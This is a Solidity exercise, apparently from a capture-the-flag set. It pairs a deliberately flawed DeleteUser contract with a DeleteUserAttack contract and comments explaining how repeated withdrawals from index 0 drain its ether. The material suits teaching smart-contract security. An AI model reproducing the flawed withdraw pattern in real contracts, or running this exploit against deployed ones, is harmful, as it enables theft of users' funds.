pragma solidity 0.8.20;

/**
 * This contract starts with 1 ether.
 * Your goal is to steal all the ether in the contract.
 *
 */
 
contract DeleteUser {
    struct User {
        address addr;
        uint256 amount;
    }

    User[] private users;

    function deposit() external payable {
        users.push(User({addr: msg.sender, amount: msg.value}));
    }

    function withdraw(uint256 index) external {
        User storage user = users[index];
        require(user.addr == msg.sender);
        uint256 amount = user.amount;

        user = users[users.length - 1];
        users.pop();

        msg.sender.call{value: amount}("");
    }
}

contract DeleteUserAttack {
    DeleteUser public deleteUser;

    constructor(address _deleteUser) payable {
        deleteUser = DeleteUser(_deleteUser);
    }

    /// @dev deposit will always push a new struct to the array (even if theyre are in it),
    /// and the withdraw function will always pop the last struct from the array (not the index we retrieve funds from).
    /// To exploit this, we can deposit 1 ether, then deposit 0 ether, then withdraw from index 0 twice (the index with 1 ether deposited).
    /// This will give us 2 ether and pop both of our structs from the array, even though one of the structs was empty.
    function Attack() public {
        deleteUser.deposit{value: 1 ether}();
        deleteUser.deposit{value: 0}();
        deleteUser.withdraw(0);
        deleteUser.withdraw(0);
    }

    receive() external payable {}
}